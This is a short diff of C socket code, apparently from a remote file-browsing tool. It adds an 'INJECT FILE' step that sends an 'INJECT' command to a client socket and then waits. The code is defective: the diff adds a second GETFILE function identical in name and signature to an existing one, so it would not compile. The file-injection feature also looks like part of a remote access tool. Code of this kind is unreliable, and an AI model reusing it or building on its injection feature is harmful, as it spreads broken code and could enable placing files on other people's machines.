@@ -235,6 +235,7 @@ DWORD WINAPI surfMode(LPVOID paramS) {
 				break;
 
 			case '8':	//INJECT FILE
+				showPWD(param);
 				showInorderFile(param);
 				break;
 
@@ -309,4 +310,20 @@ void GETFILE(void * paramS){
 	}
 
 	fclose(fp);
+}
+
+void GETFILE(void * paramS){
+	paramSurf * param = (paramSurf *) paramS;
+
+	char buffer[512] = {0};
+
+	strcpy(buffer, "INJECT");
+	send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
+	memset(buffer, 0, strlen(buffer));
+	Sleep(11);
+
+	strcpy((param)->input, "NULL");
+
+	while(strcmp((param)->input, "NULL")==0) Sleep(500);
+
 }
